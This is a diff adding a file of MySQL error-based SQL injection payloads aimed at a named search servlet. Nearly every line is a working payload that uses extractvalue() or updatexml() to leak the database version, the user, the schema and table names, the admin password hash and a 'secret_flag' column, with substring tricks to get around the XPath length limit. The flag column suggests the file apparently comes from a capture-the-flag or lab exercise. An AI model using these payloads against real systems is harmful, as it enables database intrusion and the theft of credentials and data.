@@ -1,0 +1,29 @@
+# ==========================================================
+# SQL Injection Payloads: Error-based Exploitation
+# Target: SearchServlet -> ProductDAO.searchProducts()
+# Engine: MySQL 5.7+ / 8.0+
+# Mechanism: Induces XPath parsing error using extractvalue() or updatexml()
+# ==========================================================
+
+# 1. Extract MySQL Database Version
+' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- 
+
+# 2. Extract Current Database User
+' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e)) -- 
+
+# 3. Extract Current Database Name
+' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) -- 
+
+# 4. Extract Table Names from current database
+' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)) -- 
+' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 0x7e)) -- 
+
+# 5. Extract Admin Password Hash via UpdateXML
+' AND updatexml(1, concat(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e), 1) -- 
+
+# 6. Extract Secret Flag via ExtractValue
+' AND extractvalue(1, concat(0x7e, (SELECT secret_flag FROM users WHERE username='admin'), 0x7e)) -- 
+
+# 7. Substring extraction for strings longer than 32 chars (XPath limit)
+' AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(secret_flag, 1, 30) FROM users WHERE username='admin'), 0x7e)) -- 
+' AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(secret_flag, 31, 30) FROM users WHERE username='admin'), 0x7e)) -- 
